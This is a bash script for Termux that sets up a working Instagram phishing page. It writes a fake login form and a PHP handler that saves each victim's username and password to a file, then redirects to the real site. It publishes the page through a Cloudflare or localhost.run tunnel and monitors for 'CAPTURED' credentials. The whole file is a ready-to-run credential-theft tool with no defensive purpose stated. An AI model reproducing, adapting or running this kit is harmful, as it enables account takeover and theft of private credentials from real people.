#!/bin/bash

# --- 1. SETUP & FORCE CLEANUP ---
clear
echo -e "\033[1;33m[*] Fixing System & Ports...\033[0m"

# Install Tool to Kill Ports (psmisc)
pkg install psmisc php wget curl proot resolv-conf -y > /dev/null 2>&1

# Kill Everything forcefully
pkill -f php
pkill -f cloudflared
# Agar purana port fasa hai to use jabardasti maaro
fuser -k 8080/tcp > /dev/null 2>&1

rm -rf auth/ cloud.log
mkdir -p auth
touch usernames.txt

# --- 2. GENERATE RANDOM PORT (The Magic Fix) ---
# Hum 3000 se 9000 ke beech koi bhi random number lenge
# Isse 'Address already in use' kabhi nahi aayega
PORT=$((3000 + RANDOM % 6000))

# --- 3. CREATE HTML (Your Design) ---
cat > auth/index.php <<EOF
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Instagram Login</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:sans-serif;}
body{background:#000;color:#fff;display:flex;justify-content:center;align-items:center;height:100vh;}
.card{width:350px;padding:20px;text-align:center;}
.logo{width:180px;margin-bottom:20px;}
input{width:100%;padding:12px;margin:6px 0;background:#121212;border:1px solid #333;color:white;border-radius:4px;outline:none;}
input:focus{border:1px solid #777;}
button{width:100%;padding:12px;margin-top:10px;background:#0095f6;color:white;border:none;border-radius:4px;font-weight:bold;cursor:pointer;}
</style>
</head>
<body>
<div class="card">
    <img class="logo" src="https://i.imgur.com/zqPwkZl.png">
    <form action="login.php" method="POST">
        <input type="text" name="u" placeholder="Phone number, username, or email" required>
        <input type="password" name="p" placeholder="Password" required>
        <button type="submit">Log in</button>
    </form>
</div>
</body>
</html>
EOF

# --- 4. PHP BACKEND ---
cat > auth/login.php <<EOF
<?php
file_put_contents("../usernames.txt", "User: " . \$_POST['u'] . " | Pass: " . \$_POST['p'] . "\n", FILE_APPEND);
header('Location: https://instagram.com');
exit();
?>
EOF

# --- 5. INTERFACE ---
clear
G='\033[1;32m'
Y='\033[1;33m'
C='\033[1;36m'
R='\033[1;31m'
RESET='\033[0m'

echo -e "${G}=======================================${RESET}"
echo -e "${Y}   ANURAG HKR - RANDOM PORT FIX        ${RESET}"
echo -e "${G}=======================================${RESET}"
echo -e "${C}System Port Assigned: ${R}$PORT ${RESET}"
echo ""
echo -e "${C}[1] Localhost (Offline)${RESET}"
echo -e "${C}[2] Cloudflare (Online Link)${RESET}"
echo ""
echo -ne "${Y}Select: ${RESET}"
read option

# --- 6. LOGIC ---
if [[ $option == "1" ]]; then
    echo -e "${Y}[*] Starting Server on Port $PORT...${RESET}"
    
    # Starting PHP on Random Port using termux-chroot
    termux-chroot php -S 127.0.0.1:$PORT -t auth > /dev/null 2>&1 &
    sleep 3
    
    echo -e "${G}[✔] RUNNING SUCCESS!${RESET}"
    echo -e "${C}Link: http://127.0.0.1:$PORT${RESET}"

elif [[ $option == "2" ]]; then
    # Download Cloudflare if missing
    if [ ! -f "cloudflared" ]; then
        echo -e "${Y}[*] Downloading Engine...${RESET}"
        wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared
        chmod +x cloudflared
    fi
    
    echo -e "${Y}[*] Starting Services on Port $PORT...${RESET}"
    
    # 1. Start PHP
    termux-chroot php -S 127.0.0.1:$PORT -t auth > /dev/null 2>&1 &
    sleep 2
    
    # 2. Start Tunnel (Pointing to Random Port)
    termux-chroot ./cloudflared tunnel -url http://127.0.0.1:$PORT --logfile cloud.log > /dev/null 2>&1 &
    
    echo -ne "${C}[*] Generating Link... ${RESET}"
    for i in {1..10}; do
        if [ -f cloud.log ]; then
            LINK=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "cloud.log" | head -n 1)
            if [ ! -z "$LINK" ]; then
                echo -e "\n\n${G}[✔] LINK GENERATED:${RESET}"
                echo -e "${Y}$LINK${RESET}\n"
                break
            fi
        fi
        echo -ne "."
        sleep 2
    done
    
    if [[ -z "$LINK" ]]; then
        echo -e "\n${R}[!] Retrying with backup...${RESET}"
        # Backup: Localhost.run (Agar Cloudflare fail ho)
        ssh -R 80:localhost:$PORT nokey@localhost.run
    fi
fi

# --- 7. MONITOR ---
echo -e "${C}[*] Waiting for Victims...${RESET}"
while true; do
    if [ -f usernames.txt ]; then
        tail -n 0 -f usernames.txt | while read line; do
            echo -e "${R}[!] CAPTURED: ${G}$line${RESET}"
            echo -e "\a"
        done
    fi
done
